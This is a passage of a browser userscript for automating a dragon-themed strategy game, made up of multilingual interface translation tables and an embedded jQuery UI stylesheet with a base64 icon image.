            "Scanning Map": "Scansione della mappa entro $NUM$ chilometri <BR> Richiederà del tempo",
            "Script Options": "Opzioni Script",
            "Search Radius": "Raggio di ricerca",
            "Second value must be at least": "Il maaggiore deve essere almeno",
            Seconds: "Secondi",
            "Send Dragon every certain number of waves": "Invia il Drago una volta ogni tot Onde",
            "Start Date": "Data d'inizio",
            "Stop if any troops lost": "Ferma gli attacchi se muoiono delle truppe",
            Successfully: "Successo",
            Summary: "Sintesi",
            Targets: "Obiettivi",
            "Task Completed": "Attività Completate",
            Tasks: "Attività",
            "Too many errors,  disabling auto train": "Troppi errori, addestramento automatico fermato",
            "Too many troops for muster point level": "Il livello del Punto di Raduno non supporta cosi tante truppe",
            "Training Configuration": "Configurazione Addestramento",
            "Training queue": "Elenco truppe in addestramento",
            "Troops for Wave Attack": "Truppe per l'attacco ad Onda",
            "Troops lost": "Hai perso delle truppe",
            "Troops Not Defined": "Truppe Non definito",
            "Use the Levels Tab to select attack areas": "Usa la scheda Livelli per selezionare le aree da attaccare",
            "Userset maximum marches reached": "Numero massimo di marce raggiunto",
            "Verbose logging": "Accesso con informazioni",
            waiting: "sto aspettando",
            Warnings: "Avvertenze",
            "Wave attack to": "Attacco ad Onda verso",
            Wave: "Onda",
            "Window drag": "Trascina la finestra con il mouse",
            "Withdraw troops if they are encamped": "Ritira le truppe se si sono accampate",
            "~AquaTroop": "Abissi",
            "~ArmoredTransport": "Blindati",
            "~BattleDragon": "DragoGue",
            "~Conscript": "Recluta",
            "~FireDragon": "DrgFuoco",
            "~FireMirror": "SpecchiF",
            "~FireTroop": "Magma",
            "~Giant": "Giganti",
            "~GreatDragon": "DrgBase",
            "~Halberdsman": "Alabarde",
            "~Longbowman": "Arcieri",
            "~Minotaur": "Minotaur",
            "~PackDragon": "DraghiTS",
            "~Porter": "Portanti",
            "~Spy": "Spia",
            "~StoneDragon": "DrgPietr",
            "~StoneTroop": "OrcoGran",
            "~SwiftStrikeDragon": "DragoVel",
            "~WaterDragon": "DrgAcqua",
            "~WindDragon": "DrgVento",
            "~WindTroop": "Banshee",
            "~Zzz": "Zzz"
        };
        break;
    case "nl":
        LANG_OBJECT = {
            "above the first value": "boven de eerste waarde",
            "Action Logs": "Actie Logs",
            Actions: "Acties",
            and: "en",
            "Are you sure you want to": "Weet je zeker dat je",
            at: "bij",
            "Attack One Target in Waves": "Val 1 doel aan in waves",
            "Attack sent to": "Aanval verzonden naar",
            Attacking: "Aanvallen",
            "Attacks Configuration": "Aanval Configuratie",
            "Attacks Logs": "Aanvallen Logs",
            "Attacks stopped momentarily to prevent server blocking": "Aanvallen stopte even naar de server blokkeren te voorkomen",
            Attacks: "Aanvallen",
            "Auto Refresh every": "Auto Vernieuwen om de",
            Automatically: "Automatisch",
            "Awaiting task completion notification": "In afwachting van voltooiing van de taak melding",
            Building: "Bouw",
            Busy: "Bezig",
            by: "door",
            "Clear last attack on all maps": "Wis laatste aanval op alle kaarten",
            "Clear last attack on current map": "Wis laatste aanval op de huidige kaart",
            Config: "Configuratie",
            "Console Logs": "UitgebreideLogs",
            Console: "Uitgebreid",
            Coordinates: "Coördinaten",
            Days: "Dagen",
            "Delay Between Attacks": "Vertraging tussen de aanvallen",
            Disabled: "Deactiveren",
            "Distance must be between": "Afstand moet tussen",
            Distance: "Afstand",
            "Dont make Wildernesses of the terrains attacked": "Neem geen wildernissen over",
            Enable: "Inschakelen",
            Enabled: "Ingeschakeld",
            Error: "Error",
            "First value must be between": "Eerste waarde moet liggen tussen",
            Full: "Vol",
            "Game Options": "Spel opties",
            "Going to the coords": "Gaat naar de coördinaten",
            Hiding: "Verbergen",
            Hour: "Uur",
            Hours: "Uren",
            Info: "Info",
            "Invalid Date From": "Ongeldige Datum Vanuit",
            "Invalid Date To": "Ongeldige Datum To",
            "Invalid delays": "Ongeldige vertragingen",
            "Invalid number of troops": "Ongeldig aantal troepen",
            "Invalid Range Date": "Ongeldige Range datum",
            "Last Attack": "Laatste Aanval",
            Loaded: "Geladen",
            Logs: "Logs",
            "Manual attack sent to": "Aanval handmatig verzonden naar",
            "Maximum simultaneous marches": "Maximaal gelijktijdige marsen",
            miles: "mijlen",
            "Minimum Housing": "Minimale behuizing",
            "Minimum Resource Levels": "Minimale grondstoffen",
            Minutes: "Minuten",
            "No Generals Available": "Geen generaals beschikbaar",
            "No targets or troops available": "Geen targets of troepen beschikbaar",
            "No troops available": "Geen troepen beschikbaar",
            "No Troops Defined": "Geen troepen ingevoerd",
            "Not enough": "Niet genoeg",
            Not: "Niet",
            "of inactivity": "van inactiviteit",
            of: "van",
            "Opening the map on the last position": "Openen van de kaart op de laatste positie",
            Options: "Opties",
            "Outpost 1": "Voorpost 1",
            "Outpost 2": "Voorpost 2",
            "Outpost 3": "Voorpost 3",
            "Outpost 4": "Voorpost 4",
            "Permanent Data": "Permanente Gegevens",
            "Preparing Attack": "Aanval voorbereiden",
            Refresh: "Verversen",
            Researching: "Onderzoek",
            "Retry in": "Opnieuw in",
            "Run Time": "Uitvoeringstijd",
            "Safe Mode": "Veilige Modus",
            "Scanning Map": "Scannen kaart binnen $NUM$ mijl <BR> Dit duurt ongeveer",
            "Script Options": "Script opties",
            "Search Radius": "Zoek in een straal",
            "Second value must be at least": "Tweede waarde moet minimaal",
            Seconds: "Seconden",
            "Send Dragon every certain number of waves": "Stuur Dragon elke aantal waves",
            "Start Date": "Start datum",
            "Stop if any troops lost": "Stop bij verliezen",
            Successfully: "Succesvol",
            Summary: "Overzicht",
            Targets: "Doelen",
            "Task Completed": "Taak voltooid",
            Tasks: "Taken",
            "Too many errors,  disabling auto train": "Te veel fouten, automatisch trainen uitgeschakeld.",
            "Too many troops for muster point level": "Te veel troepen voor verzamelpunt niveau",
            "Training Configuration": "Trainings Configuratie",
            "Training queue": "Trainings wachtrij",
            "Troops for Wave Attack": "Troepen voor Wave aanval",
            "Troops lost": "Troepen verloren",
            "Troops Not Defined": "Troepen niet gedefinieerd",
            "Use the Levels Tab to select attack areas": "Gebruik het tabblad Niveaus om de aan te vallen gebieden te selecteren",
            "Userset maximum marches reached": "Maximaal aantal marsen bereikt",
            "Verbose logging": "Uitgebreid loggen",
            waiting: "wachten",
            Warnings: "Waarschuwingen",
            "Wave attack to": "Aanval op",
            Wave: "Wave",
            "Window drag": "Venster slepen",
            "Withdraw troops if they are encamped": "Troepen terug trekken als deze versterken.",
            "~AquaTroop": "Visjes",
            "~ArmoredTransport": "AT's",
            "~BattleDragon": "BD",
            "~Conscript": "Rekruut",
            "~FireDragon": "Vuur Draak",
            "~FireMirror": "Spiegels",
            "~FireTroop": "Pyro",
            "~Giant": "Reus",
            "~GreatDragon": "Grote Draak",
            "~Halberdsman": "Helbaar",
            "~Longbowman": "LBM",
            "~Minotaur": "Mino",
            "~PackDragon": "TS Draak",
            "~Porter": "Drager",
            "~Spy": "Spion",
            "~StoneDragon": "Steen Draak",
            "~StoneTroop": "Oger",
            "~SwiftStrikeDragon": "SSD",
            "~WaterDragon": "Water Draak",
            "~WindDragon": "Wind Draak",
            "~WindTroop": "Banshee",
            "~Zzz": "Zzz"
        };
        break;
    case "pl":
        LANG_OBJECT = {
            "above the first value": "powyzej pierwszej wartosci",
            "Action Logs": "Dzienniki dzialaniu",
            Actions: "Akcje",
            and: "i",
            "Are you sure you want to": "Czy na pewno chcesz",
            at: "w",
            "Attack One Target in Waves": "Jeden cel ataku w Fala",
            "Attack sent to": "Wyslane do Atak",
            Attacking: "Atak",
            "Attacks Configuration": "Ataki Konfiguracja",
            "Attacks Logs": "Logi Ataki",
            "Attacks stopped momentarily to prevent server blocking": "Ataki zatrzymal sie na chwile, aby zapobiec blokowaniu serwerów",
            Attacks: "Ataki",
            "Auto Refresh every": "Automatyczne odswiezanie co",
            Automatically: "Automatycznie",
            "Awaiting task completion notification": "Oczekiwanie na zakonczenie zadania zgloszeniu",
            Building: "Budowanie",
            Busy: "Zajety",
            by: "prze",
            "Clear last attack on all maps": "Usun ostatnie atak na wszystkich mapach",
            "Clear last attack on current map": "Usun ostatnie atak na aktualna mape",
            Config: "Konfiguracja",
            "Console Logs": "Dzienniki Konsola",
            Console: "Konsola",
            Coordinates: "Wspólrzedne",
            Days: "Dni",
            "Delay Between Attacks": "Przerwa pomiedzy atakami",
            Disabled: "Dezaktywowac",
            "Distance must be between": "Odleglosc powinna wynosic od",
            Distance: "Odleglosc",
            "Dont make Wildernesses of the terrains attacked": "Nie należy puszczach z terenów zaatakowany",
            Enable: "Wlac",
            Enabled: "Wlaczone",
            Error: "Blad",
            "First value must be between": "Wartosc musi byc pierwsze entre",
            Full: "Pelny",
            "Game Options": "Opcje gry",
            "Going to the coords": "Przechodzac do wspólrzednych",
            Hiding: "Ukrywanie",
            Hour: "Godziny",
            Hours: "Godziny",
            Info: "Informacje",
            "Invalid Date From": "Nieprawidlowe dane od",
            "Invalid Date To": "Nieprawidlowe dane do",
            "Invalid delays": "Niewazny opóznienia",
            "Invalid number of troops": "Bledna liczba zolnierzy",
            "Invalid Range Date": "Nieprawidlowy zakres dat",
            "Last Attack": "Ostatni atak",
            Loaded: "Zaladowany",
            Logs: "Dzienniki",
            "Manual attack sent to": "Podrecznik wyslane do ataku",
            "Maximum simultaneous marches": "Maksymalna jednoczesne marsze",
            miles: "mil",
            "Minimum Housing": "Minimalna Obudowa",
            "Minimum Resource Levels": "Minimalnego poziomu zasobów",
            Minutes: "Minut",
            "No Generals Available": "Niedostepny generalnych",
            "No targets or troops available": "Nie celów lub dostepnych oddzialów",
            "No troops available": "Wojsko nie jest dostepna",
            "No Troops Defined": "Nie zdefiniowane Troops",
            "Not enough": "A Malo",
            Not: "Nie",
            "of inactivity": "bezczynnosci",
            of: "z",
            "Opening the map on the last position": "Otwarcie mapy na ostatniej pozycji",
            Options: "Opcje",
            "Permanent Data": "Stale Danych",
            "Preparing Attack": "Przygotowanie Atak",
            Refresh: "Odswiez",
            Researching: "Badania",
            "Retry in": "Ponowna próba",
            "Run Time": "Czas pracy",
            "Safe Mode": "Tryb awaryjny",
            "Scanning Map": "W $NUM$ mil Skanowanie map <BR> powinna to okolo czas",
            "Script Options": "Opcje Script",
            "Search Radius": "OdlegL",
            "Second value must be at least": "Druga wartosc musi wynosic co najmniej",
            Seconds: "Sekund",
            "Send Dragon every certain number of waves": "Wyslij Smoka co pewnej liczby Fala",
            "Start Date": "Poczatek",
            "Stop if any troops lost": "Stop, jezeli jakiekolwiek wojska stracone",
            Successfully: "Powodzeniem",
            Summary: "Podsumowanie",
            Targets: "Cele",
            "Task Completed": "Adanie Wykonane",
            Tasks: "Zadania",
            "Too many errors,  disabling auto train": "Byt wiele bledów, wylaczenie pociagu auto",
            "Too many troops for muster point level": "Byt wielu zolnierzy zebrac punkt za poziom",
            "Training Configuration": "Konfiguracja Szkolenia",
            "Training queue": "Szkolenia kolejki",
            "Troops for Wave Attack": "Fala Atak wojsk",
            "Troops lost": "Wojsko Stracone",
            "Troops Not Defined": "Wojsko Nie zdefiniowane",
            "Use the Levels Tab to select attack areas": "Uzyciu karty Poziom wybrac obszary atak",
            "Userset maximum marches reached": "Maksymalnie marsze Zasieg UserSet",
            "Verbose logging": "Verbose logging",
            waiting: "czeka",
            Warnings: "Ostrzezenia",
            "Wave attack to": "Atak Fala",
            Wave: "Fala",
            "Window drag": "Okna przeciagnij",
            "Withdraw troops if they are encamped": "Wycofania wojsk jeśli są one obóz",
            "~Zzz": "Zzz"
        };
        break;
    case "ru":
    case "tt":
        LANG_OBJECT = {
            "above the first value": "больше первого значения",
            "Action Logs": "Журнал действий",
            Actions: "Действия",
            and: "и",
            at: "в",
            "Attack One Target in Waves": "Атаковать одну цель волнами",
            "Attack sent to": "Войска атакуют",
            Attacking: "Атака",
            Attacks: "Атаки",
            "Attacks Configuration": "Настройка атак",
            "Attacks Stats": "Статистика атак",
            "Attacks stopped momentarily to prevent server blocking": "Атаки приостановлены для предотвращения блокировок сервером",
            Attacks: "Атаки",
            "Auto Refresh every": "Автообновление каждые",
            Automatically: "Автоматически",
            "Awaiting task completion notification": "Ожидание результатов задания",
            Building: "Строительство",
            Busy: "Занято",
            by: " ",
            "Clear last attack on all maps": "Очистка время атак на всех картах",
            "Clear last attack on current map": "Очистка время атак на этой карте",
            Config: "Конфигурация",
            "Console Logs": "Журнал консоли",
            Console: "Консоль",
            Coordinates: "Координаты",
            d: "дн.",
            Days: "Дней",
            "Delay Between Attacks": "Пауза между атаками",
            Disabled: "Выключено",
            "Distance must be between": "Расстояние должно быть между",
            Distance: "Расстояние",
            "Dont make Wildernesses of the terrains attacked": "Dont make Wildernesses of the terrains attacked",
            Enable: "Включить",
            Enabled: "Включено",
            Error: "Ошибка",
            "First value must be between": "Первое значение должно быть между",
            Full: "Полный",
            "Game Options": "Настройки игры",
            "Going to the coords": "Переход на координаты",
            h: "ч",
            Hiding: "Скрыты",
            Hour: "Час",
            Hours: "Часов",
            Info: "Инф.",
            "Invalid Date From": "Неправильная дата",
            "Invalid Date To": "Неправильная дата",
            "Invalid delays": "Неправильная пауза",
            "Invalid number of troops": "Не корректное число войск",
            "Invalid Range Date": "Неправильная дата",
            "Last Attack": "Последняя атака",
            Loaded: "Загружено",
            Logs: "Журнал",
            m: "мин",
            "Manual attack sent to": "Ручная отправка войск",
            "Maximum simultaneous marches": "Максимум одновременных атак",
            miles: "клеток",
            "Minimum Housing": "Минимально по населению",
            "Minimum Resource Levels": "Минимально по ресурсам",
            Minutes: "Минут",
            "No Generals Available": "Нет свободных генералов",
            "No targets or troops available": "Нет доступных целей или войск",
            "No troops available": "Не хватает войск",
            "No Troops Defined": "Не указаны войска",
            "Not enough": "Не хватает",
            Not: "Не",
            "of inactivity": "бездействия",
            of: " ",
            "Opening the map on the last position": "Открытие карты на последней позиции",
            Options: "Настройки",
            "Outpost 1": "Аутпост 1",
            "Outpost 2": "Аутпост 2",
            "Outpost 3": "Аутпост 3",
            "Outpost 4": "Аутпост 4",
            "Permanent Data": "Permanent Data",
            "Preparing Attack": "Подготовка к атаке",
            Refresh: "Обновить",
            Researching: "Исследование",
            "Retry in": "Повторить",
            "Run Time": "Время выполнения",
            s: "сек",
            "Safe Mode": "Безопасный режим",
            "Scanning Map": "Сканирование карты радиусом $NUM$ клеток BR> Это займет немного времени",
            "Script Options": "Настройки скрипта",
            "Search Radius": "Диапазон поиска",
            "Second value must be at least": "второе значение должно быть больше",
            Seconds: "Секунд",
            "Send Dragon every certain number of waves": "Посылать Дракона в волну",
            "Start Date": "Дата начала",
            "Stop if any troops lost": "Остановить при потере войск",
            Successfully: "Успешно",
            Summary: "Итог",
            Targets: "Цели",
            "Task Completed": "Задача выполнена",
            Tasks: "Задания",
            "Too many errors, disabling auto train": "Много ошибок, отключение автообучения",
            "Too many troops for muster point level": "Много войск для текущего уровня военкомата",
            "Training Configuration": "Настройки автообучения войск",
            "Training queue": "Очередь обучения",
            "Troops for Wave Attack": "Войска для атаки волнами",
            "Troops lost": "Потери войск",
            "Troops Not Defined": "Войска не указаны",
            "Use the Levels Tab to select attack areas": "Укажите цели для атаки на вкладке уровней",
            "Userset maximum marches reached": "Достигнуто максимально указанное число атак",
            "Verbose logging": "Подробный журнал",
            waiting: "ожидание",
            Warnings: "Warnings",
            "Wave attack to": "Атаковать волнами",
            Wave: "Волна",
            "Window drag": "Двигать окно",
            "Withdraw troops if they are encamped": "Отзывать войска при захвате поля",
            "~AquaTroop": "FT",
            "~ArmoredTransport": "AT",
            "~BattleDragon": "BD",
            "~Conscript": "Conscr",
            "~FireDragon": "Fire Drg",
            "~FireMirror": "FM",
            "~FireTroop": "LJ",
            "~Giant": "Giant",
            "~GreatDragon": "Grt Drg",
            "~Halberdsman": "Halbrd",
            "~Longbowman": "LBM",
            "~Minotaur": "Mino",
            "~PackDragon": "Drg Carg",
            "~Porter": "Porter",
            "~Spy": "Spy",
            "~StoneDragon": "Stn Drg",
            "~StoneTroop": "Ogre",
            "~SwiftStrikeDragon": "SSD",
            "~WaterDragon": "Wat Drg",
            "~WindDragon": "Wnd Drg",
            "~WindTroop": "Banshee",
            "~Zzz": "Zzz"
        };
        break;
    case "tr":
    case "tk":
        Y = "tr";
        LANG_OBJECT = {
            "above the first value": "Ilk degerin üstünde",
            "Action Logs": "Eylem Kayitlar",
            Actions: "Eylemler",
            and: "ve",
            "Are you sure you want to": "Istediginiz emin",
            at: "az",
            "Attack One Target in Waves": "Dalgalari Bir Hedef Saldiri",
            "Attack sent to": "Saldiri gönderildi",
            Attacking: "Saldirmak",
            "Attacks Configuration": "Yapilandirma Saldirilari",
            "Attacks Logs": "Saldirilar Kayitlar",
            "Attacks stopped momentarily to prevent server blocking": "Saldirilari engelleme sunucu önlemek için bir an durdu",
            Attacks: "Saldirilar",
            "Auto Refresh every": "Otomatik Yenileme her",
            "Auto-Collection of Resources": "Karakollarini Otomatik hasat kaynaklari her",
            Automatically: "Otomatik",
            "Awaiting task completion notification": "Bekliyor görev tamamlama bildirimi",
            "Battle Report": "Raporlari Sil",
            Building: "Bina",
            Busy: "Mesgul",
            by: "ile",
            "Clear last attack on all maps": "Tüm haritalarda açik son saldiri",
            "Clear last attack on current map": "Mevcut harita üzerinde net son saldiri",
            Config: "Yapilandirma",
            "Console Logs": "Konsol Kayitlar",
            Console: "Konsol",
            Coordinates: "Koordinatlar",
            Off: "bosta",
            Days: "Günleri",
            "Delay Between Attacks": "Saldirilar Arasindaki Gecikme",
            Disabled: "Engelli",
            "Distance must be between": "Mesafe arasinda olmalidir",
            Distance: "Mesafe",
            "Dont make Wildernesses of the terrains attacked": "Arazilerde yapmayın Wildernesses saldırdı",
            Enable: "Etkinlestir",
            Enabled: "Etkin",
            Error: "Hata",
            "First value must be between": "Ilk degeri arasinda olmalidir",
            Full: "Tam",
            "Game Options": "Oyun Seçenekleri",
            "Going to the coords": "Koordinatlari gitmek",
            Hiding: "Gizleme",
            Hour: "Saat",
            Hours: "Saat",
            Info: "Bilgi",
            "Invalid Date From": "Geçersiz Tarih",
            "Invalid Date To": "Geçersiz Tarih",
            "Invalid delays": "Geçersiz gecikmeler",
            "Invalid number of troops": "Geçersiz asker sayisi",
            "Invalid Range Date": "Geçersiz Araligi Tarihi",
            "Last Attack": "Son Saldiri",
            Loaded: "Yüklü",
            Logs: "Kayitlar",
            "Manual attack sent to": "Ile gönderilen Manuel saldiri",
            "Maximum simultaneous marches": "Maksimum eszamanli yürüyüslerle",
            miles: "mil",
            "Minimum Housing": "Asgari Konut",
            "Minimum Resource Levels": "Asgari Kaynak Seviyeleri",
            Minutes: "Dakika",
            "Muster Point": "Nokta Muster",
            "My Generals": "Generaller",
            "No Generals Available": "Hayir Generals kullanilabilir",
            "No targets or troops available": "Yok hedefler veya asker",
            "No troops available": "Yok askerlerinin",
            "No Troops Defined": "Askerler Tanimli",
            "Not enough": "Yeterli degil",
            Not: "Degil",
            "of inactivity": "hareketsizlik",
            of: ",",
            "Opening the map on the last position": "Son konumu harita açma",
            Options: "Seçenekler",
            "Outpost 1": "Su Sehri",
            "Outpost 2": "Tas Sehir",
            "Outpost 3": "Ates Sehir",
            "Outpost 4": "Rüzgar Sehir",
            "Permanent Data": "Kalici Veri",
            "Preparing Attack": "Saldiri hazirlanmasi",
            Refresh: "Yenile",
            Required: "Gerek",
            Researching: "Arastirma",
            "Run Time": "Çalisma Süresi",
            "Safe Mode": "Güvenli Mod",
            "Scanning Map": "Içinde $NUM$ kilometre <BR> Tarama harita bu yaklasik bir dakika zaman",
            "Script Options": "Komut Seçenekleri",
            "Search Radius": "Arama yariçapi",
            "Second value must be at least": "Ikinci deger olmali, en azindan",
            Seconds: "Degil",
            "Send Dragon every certain number of waves": "Ejderha dalgalarin her belirli sayida Dalga",
            "Start Date": "Baslangiç ??Tarihi",
            Statistics: "Istatistik",
            "Stop if any troops lost": "Herhangi bir asker kaybetti Durdur",
            Successfully: "Basariyla",
            Summary: "Özet",
            Targets: "Hedefler",
            "Task Completed": "Görev Tamamlandi",
            Tasks: "Görevler",
            "Too many errors,  disabling auto train": "Çok fazla hata, otomatik tren devre disi birakma",
            "Too many troops for muster point level": "Görememesi noktasi seviyesi için çok sayida asker",
            "Training Configuration": "Egitim Yapilandirma",
            "Training queue": "Egitim kuyruk",
            "Troops for Wave Attack": "Dalgalanma asker Saldirilari",
            "Troops lost": "Askerler kaybetti",
            "Troops Not Defined": "Askerler Tanimli degil",
            "Use the Levels Tab to select attack areas": "Saldiri alanlarini seçmek için Seviyeleri Sekmesini kullanin",
            "Userset maximum marches reached": "Ayarlidir maksimum ulasti yürüyüsleri",
            "Verbose logging": "Günlügü etkinlestir",
            waiting: "bekleyen",
            Warnings: "Uyarilar",
            "Wave attack to": "Dalga saldiri",
            Wave: "Dalga",
            "Window drag": "Sürükleme etkinlestirin",
            "Withdraw troops if they are encamped": "Kamp eğer birliklerinin geri çekilmesi",
            "~Zzz": "Zzz"
        };
        break;
    default:
        LANG_OBJECT = {
            "Dont make Wildernesses of the terrains attacked": "Don't make Wildernesses of the terrains attacked",
            "Outpost 1": "Water Dragon Outpost",
            "Outpost 2": "Stone Dragon Outpost",
            "Outpost 3": "Fire Dragon Outpost",
            "Outpost 4": "Wind Dragon Outpost",
            "Scanning Map": "Scanning map within $NUM$ miles<BR>This should take about a time",
            "~AquaTroop": "Fang",
            "~ArmoredTransport": "ArmTrans",
            "~BattleDragon": "Bat Drg",
            "~Conscript": "Conscr",
            "~FireDragon": "Fire Drg",
            "~FireMirror": "Fire Mir",
            "~FireTroop": "LavaJaws",
            "~Giant": "Giant",
            "~GreatDragon": "Grt Drg",
            "~Halberdsman": "Halbrd",
            "~Longbowman": "LB Man",
            "~Minotaur": "Mino",
            "~PackDragon": "PckDrg",
            "~Porter": "Porter",
            "~Spy": "Spy",
            "~StoneDragon": "Stn Drg",
            "~StoneTroop": "Ogre",
            "~SwiftStrikeDragon": "SS Drg",
            "~WaterDragon": "Wat Drg",
            "~WindDragon": "Wnd Drg",
            "~WindTroop": "Banshee",
            "~Zzz": "Zzz"
        }
    }
    $J.each(["bnt_blue", "bnt_cyan", "bnt_green", "btn_on", "btn_off", "bnt_red", "bnt_purple", "bnt_red", "bnt_yellow", "bold_red", "compact_table", "content", "defending", "hiding", "hide_inputbox", "main-box", "march_camp", "march_wave", "row_top_headers", "scrollable", "status_feedback", "status_report", "status_ticker", "subtitle", "support_link", "table", "table_headers", "title", "map-viewer", "map-viewer-box", "map-viewer-dragger"], function (a, b) {
        setUID(b)
    });
    $J("<style>").append('/* jQuery UI CSS Framework 1.8.16 *//* Layout helpers----------------------------------*/.ui-helper-hidden{display: none;}.ui-helper-hidden-accessible{position: absolute !important;clip: rect(1px 1px 1px 1px);clip: rect(1px,1px,1px,1px);}.ui-helper-reset{margin: 0;padding: 0;border: 0;outline: 0;line-height: 1.2em;text-decoration: none;font-size: 100%;list-style: none;}.ui-helper-clearfix:after{content: ".";display: block;height: 0;clear: both;visibility: hidden;}.ui-helper-clearfix{display: inline-block;}/* required comment for clearfix to work in Opera */* html .ui-helper-clearfix{height:1%;}.ui-helper-clearfix{display:block;}/* end clearfix */.ui-helper-zfix{width: 100%;height: 100%;top: 0;left: 0;position: absolute;opacity: 0;filter:Alpha(Opacity=0);}/* Interaction Cues----------------------------------*/.ui-state-disabled{cursor: default !important;}/* Icons----------------------------------*//* Misc visuals----------------------------------*//* Overlays */.ui-widget-overlay{position: absolute;top: 0;left: 0;width: 100%;height: 100%;}/* states and images */.ui-icon{display: block;text-indent: -99999px;overflow: hidden;background-repeat: no-repeat;}/* Component containers----------------------------------*/.ui-widget{font-family: Trebuchet MS, Tahoma, Verdana, Arial, sans-serif;font-size: 0.9em;}.ui-widget .ui-widget{font-size: 0.9em;}.ui-widget input,.ui-widget select,.ui-widget textarea,.ui-widget button{font-family: Trebuchet MS, Tahoma, Verdana, Arial, sans-serif;font-size: 0.9em;}.ui-priority-primary,.ui-widget-content .ui-priority-primary,.ui-widget-header .ui-priority-primary{font-weight: bold;}.ui-priority-secondary,.ui-widget-content .ui-priority-secondary,.ui-widget-header .ui-priority-secondary{opacity: .7;filter:Alpha(Opacity=70);font-weight: normal;}.ui-state-disabled,.ui-widget-content .ui-state-disabled,.ui-widget-header .ui-state-disabled{opacity: .35;filter:Alpha(Opacity=35);background-image: none;}/* Icons----------------------------------*//* states and images */.ui-icon,.ui-widget-content .ui-icon{width: 16px;height: 16px;background-image: url(data:image/png;base64,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